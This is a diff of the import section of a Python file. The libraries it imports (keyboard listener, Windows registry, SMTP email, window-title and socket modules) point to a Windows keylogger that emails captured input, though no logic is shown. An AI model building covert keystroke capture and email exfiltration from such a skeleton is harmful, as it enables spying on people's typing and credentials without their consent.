@@ -1,19 +1,14 @@
 
 from pynput import keyboard
 from time import sleep, time
-from os import path, makedirs, listdir, remove
+from os import path
 from winreg import *
-from email import encoders
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
-from uuid import uuid4
-from PIL import ImageGrab
 from threading import Thread, Lock
 
 import smtplib
 import datetime
-import pyperclip
 import sys
 import win32gui as w32
 import socket
